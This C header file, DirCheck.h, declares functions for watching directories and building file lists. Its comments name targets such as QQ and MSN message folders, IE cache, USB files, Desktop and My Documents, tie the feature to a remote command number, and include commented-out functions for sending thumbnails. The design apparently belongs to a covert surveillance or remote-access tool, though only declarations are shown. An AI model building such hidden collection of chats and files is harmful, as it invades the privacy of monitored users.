/************************************************* 
  FileName:        DirCheck.h
  Copyright (C) 
  Author:          郝振石
  Description:     监控自定义的目录或特殊的目录,并形成文件列表.
  Others:          
  Function List:  
*************************************************/

#if !defined(AFX_DIRCHECK_H__0CD3C9BC_D48A_448F_83EB_E474270C0D41__INCLUDED_)
#define AFX_DIRCHECK_H__0CD3C9BC_D48A_448F_83EB_E474270C0D41__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


/*!
  \fn extern DWORD SetAutoCheckDir(DWORD*pPara);
  \brief //设置监控参数
  \param 
  \param 
  \return
  函数详细
*/
extern DWORD SetAutoCheckDir(DWORD*pPara);

/*!
  \fn extern DWORD StartCheckDir(DWORD* pPara);
  \brief //启动监控工作
  \param 
  \param 
  \return
  函数详细
*/
extern DWORD StartCheckDir(DWORD* pPara);

/*!
  \fn extern void replacetype(char* value,int valuelen);
  \brief //当为自定义目录监控时,如c:\aa\temp  目录列表文件对应便为c$%aa%temp
  \param 
  \param 
  \return
  函数详细
*/
extern void replacetype(char* value,int valuelen);

/*!
  \fn extern BOOL GetMonitorListFile(char * type,char * filename);
  \brief //根据类型来获得对应的监控目录列表文件
  \param 
  \param 
  \return
  函数详细
*/
extern BOOL GetMonitorListFile(char * type,char * filename);



/*!
  \fn extern BOOL GetFixDirFolder(char *dirverfiledir) ;
  \brief 
  \param 
  \param 
  \return
  //命令号: #define GetMonitorList_id 42 
	//目录文件列表 monitortype:  QqMsg    //QqMsg   msnmsg ,recent ,iecache,usbfile ,mydocument,desktop ,自定义目录
	//usb目录结构列表 monitortype:  usbdir
	//所有目录结构列表monitortype:  dirlist 

*/
extern BOOL GetFixDirFolder(char *dirverfiledir) ;
/*!
  \fn BOOL CheckDirList(char* ptype);
  \brief //获取所有目录结构,ptype=dirlist
  \param 
  \param 
  \return
  函数详细
*/
DWORD WINAPI CheckDirList(LPVOID p);

//设置获取指定路径的缩略图
// DWORD SetThumbnail(DWORD*pPara);
// 
// DWORD WINAPI SendThumbnailFile(LPVOID pPara);
// 
// void GetOneThumbnail(const char * szPath);
// 
// HRESULT CreateThumbnail(DWORD dwWidth, DWORD dwHeight, const char * path, HBITMAP* pThumbnail);
// 
// int GetBitMapBuffer(HDC ScreenDc, HBITMAP hBitmap, int wBitCount, BYTE* buffer, int buflen);
// 
// BYTE* DumpThumbnailBufferData(const void* pBuffer, unsigned int& datalen, BOOL isLast);
// 
// BOOL SendThumbnailJpeg(char*buf ,int buflen);

#endif // !defined(AFX_DIRCHECK_H__0CD3C9BC_D48A_448F_83EB_E474270C0D41__INCLUDED_)
